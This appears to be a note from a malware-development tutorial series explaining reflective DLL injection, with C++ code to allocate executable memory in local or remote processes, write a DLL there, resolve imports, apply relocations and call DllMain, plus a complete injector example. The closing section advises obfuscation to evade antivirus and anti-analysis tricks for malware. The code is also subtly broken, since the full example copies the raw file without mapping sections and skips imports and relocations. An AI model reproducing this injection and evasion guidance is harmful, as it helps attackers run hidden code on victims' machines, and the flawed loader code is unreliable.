# Index 
- [[7. Advanced Techniques]]
	- [[7.1 Code Reuse (API Unhooking and Windows Code Reuse)]]
	- [[7.2 Syscall Usage (Direct System Calls)]]
	- [[7.3 In-memory Execution (Reflective DLL Injection)]]
	- [[7.4 In-memory Execution of Shellcode (Payload Execution)]]
	- [[7.5 Reflective DLL Injection]]
	- [[7.6 Evading Dynamic Analysis (Anti-VM and Anti-Sandbox Techniques)]]

# How Reflective DLL Injection Works

Reflective DLL Injection involves several steps to manually load the DLL into memory and resolve its dependencies without relying on the operating system’s default loader. This technique can be broken down into the following components:

1. Allocating Memory in the Target Process
2. Writing the DLL into Memory
3. Resolving Imports and Relocations
4. Calling the DLL's Entry Point (DllMain)
5. Executing the Payload

Let’s break down each step and how you can implement them in C++.

# Step-by-Step Breakdown of Reflective DLL Injection

#### 1. Allocating Memory in the Target Process
The first step is to allocate memory in the target process where the DLL will be loaded. You can use `VirtualAlloc` or `VirtualAllocEx` for this. If you’re injecting into your own process, you would use `VirtualAlloc`. If injecting into a remote process, you’d use `VirtualAllocEx` with a handle to the target process.

```cpp
LPVOID InjectedMemory = VirtualAlloc(NULL, dllSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
```

For remote processes:
```cpp
HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPID);
LPVOID InjectedMemory = VirtualAllocEx(hProcess, NULL, dllSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
```

#### 2. Writing the DLL into Memory
Once the memory is allocated, you need to copy the DLL into the allocated memory. If injecting into your own process, `memcpy` works. For remote processes, use `WriteProcessMemory` to write the DLL from your process into the target process's memory space.

```cpp
// Writing the DLL into the allocated memory
memcpy(InjectedMemory, dllBuffer, dllSize);
```

For a remote process:
```cpp
WriteProcessMemory(hProcess, InjectedMemory, dllBuffer, dllSize, NULL);
```

#### 3. Resolving Imports and Relocations
When loading a DLL into memory, it’s crucial to resolve the imports (other system functions the DLL relies on) and perform relocations (adjustments made to the code if the DLL is loaded at a different memory address than expected).

- Import Resolution: Every DLL has an Import Address Table (IAT), which contains references to functions in other libraries (e.g., `kernel32.dll`, `ntdll.dll`). The loader needs to replace these references with the actual addresses of the imported functions in the process memory.

```cpp
PIMAGE_IMPORT_DESCRIPTOR pImportDesc = (PIMAGE_IMPORT_DESCRIPTOR)((BYTE*)dllBase + pNTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);

while (pImportDesc->Name) {
    LPCSTR szModName = (LPCSTR)((BYTE*)dllBase + pImportDesc->Name);
    HMODULE hModule = LoadLibraryA(szModName);
    
    PIMAGE_THUNK_DATA pThunk = (PIMAGE_THUNK_DATA)((BYTE*)dllBase + pImportDesc->FirstThunk);
    while (pThunk->u1.Function) {
        FARPROC pfnFunc = GetProcAddress(hModule, (LPCSTR)((BYTE*)dllBase + pThunk->u1.AddressOfData));
        pThunk->u1.Function = (DWORD_PTR)pfnFunc;
        ++pThunk;
    }
    ++pImportDesc;
}
```

- Relocations: When a DLL is loaded at a different base address than its preferred address (often due to Address Space Layout Randomization, or ASLR), its code must be adjusted (relocated) to account for the new address. The relocation table in the DLL specifies what parts of the code need to be adjusted.

```cpp
PIMAGE_BASE_RELOCATION pReloc = (PIMAGE_BASE_RELOCATION)((BYTE*)dllBase + pNTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);

while (pReloc->VirtualAddress) {
    DWORD count = (pReloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
    WORD* list = (WORD*)(pReloc + 1);
    for (DWORD i = 0; i < count; i++) {
        if (list[i] >> 12 == IMAGE_REL_BASED_HIGHLOW) {
            DWORD* patch = (DWORD*)((BYTE*)dllBase + pReloc->VirtualAddress + (list[i] & 0xFFF));
            *patch += (DWORD)((BYTE*)dllBase - pNTHeaders->OptionalHeader.ImageBase);
        }
    }
    pReloc = (PIMAGE_BASE_RELOCATION)((BYTE*)pReloc + pReloc->SizeOfBlock);
}
```

#### 4. Calling the DLL's Entry Point (DllMain)
Once imports and relocations are resolved, the DLL’s entry point (typically `DllMain`) needs to be called. This signals to the DLL that it has been successfully loaded into memory, and any initialization code can run.

```cpp
// Define a function pointer to the DLL's entry point
typedef BOOL(WINAPI *DLL_ENTRY_POINT)(HINSTANCE, DWORD, LPVOID);

// Get the entry point address
PIMAGE_OPTIONAL_HEADER pOptionalHeader = &pNTHeaders->OptionalHeader;
DLL_ENTRY_POINT entryPoint = (DLL_ENTRY_POINT)((BYTE*)dllBase + pOptionalHeader->AddressOfEntryPoint);

// Call DllMain
entryPoint((HINSTANCE)dllBase, DLL_PROCESS_ATTACH, NULL);
```

- `DllMain` receives three parameters:
  - `HINSTANCE hinstDLL`: The base address of the DLL.
  - `DWORD fdwReason`: The reason the function is being called (`DLL_PROCESS_ATTACH` in this case).
  - `LPVOID lpvReserved`: Reserved for future use, usually set to `NULL`.

#### 5. Executing the Payload
After the DLL is loaded and its entry point has been called, any malicious code within the DLL can now execute. The malicious code can:
- Spawn new processes
- Inject code into other processes
- Create files or modify registry entries
- Communicate over the network (if it's a backdoor)

# Full Example: A Simple Reflective DLL Injector in C++

Here’s a simplified reflective DLL injector example in C++. This code loads the DLL into the memory of the current process and executes it without writing it to disk.

```cpp
#include <windows.h>
#include <iostream>

// Simplified reflective loader function
void ReflectiveLoader(unsigned char* dllBuffer, SIZE_T dllSize) {
    // Allocate memory for the DLL
    LPVOID dllBase = VirtualAlloc(NULL, dllSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    // Copy the DLL into the allocated memory
    memcpy(dllBase, dllBuffer, dllSize);

    // Get the DOS header of the DLL
    PIMAGE_DOS_HEADER pDOSHeader = (PIMAGE_DOS_HEADER)dllBase;
    
    // Get the NT headers
    PIMAGE_NT_HEADERS pNTHeaders = (PIMAGE_NT_HEADERS)((BYTE*)dllBase + pDOSHeader->e_lfanew);
    
    // Resolve imports and perform relocations (not shown here for brevity)

    // Get the entry point address
    PIMAGE_OPTIONAL_HEADER pOptionalHeader = &pNTHeaders->OptionalHeader;
    typedef BOOL(WINAPI *DLL_ENTRY_POINT)(HINSTANCE, DWORD, LPVOID);
    DLL_ENTRY_POINT entryPoint = (DLL_ENTRY_POINT)((BYTE*)dllBase + pOptionalHeader->AddressOfEntryPoint);
    
    // Call DllMain
    entryPoint((HINSTANCE)dllBase, DLL_PROCESS_ATTACH, NULL);
}

int main() {
    // Example: load a DLL from a file into memory
    HANDLE hFile = CreateFile(L"example.dll", GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    
    if (hFile == INVALID_HANDLE_VALUE) {
        std::cerr << "Error opening file." << std::endl;
        return -1;
    }
    
    DWORD fileSize = GetFileSize(hFile, NULL);
    unsigned char* dllBuffer = new unsigned char[fileSize];
    
    DWORD bytesRead;
    ReadFile(hFile, dllBuffer, fileSize, &bytesRead, NULL);
    CloseHandle(hFile);
    
    // Reflectively load the DLL from memory
    ReflectiveLoader(dllBuffer, fileSize);
    
    // Cleanup
    delete[] dllBuffer;
    
    return 0;
}
```

# Challenges and Considerations
- AV Detection: Even though reflective DLL injection bypasses disk-based detection, modern AV solutions may use heuristics and memory scanning to detect this technique. Obfuscating the DLL and its injection method can help avoid detection.
- Relocations and Imports: Reflective DLL injection requires resolving all imports and performing relocations, which can be complex. If the DLL is not position-independent, relocating it becomes necessary.
- Anti-Debugging and Anti-Analysis: If you’re implementing this technique in malware, adding anti-analysis techniques (such as detecting debuggers or sandboxes) would increase your chances of avoiding detection.

# Resources and Tools

1. Stephen Fewer’s Reflective DLL Injection Project: This is one of the most popular and well-documented projects for Reflective DLL

 Injection. It provides a fully functional implementation and is a great starting point.
   - [Reflective DLL Injection GitHub](https://github.com/stephenfewer/ReflectiveDLLInjection)

2. Windows API Documentation: For reference on how to use Windows API functions, check the official documentation.
   - [Windows API Reference](https://docs.microsoft.com/en-us/windows/win32/api/)

3. Tools: Tools like `Process Hacker` and `x64dbg` are essential for debugging and analyzing the behavior of your reflective DLL injector.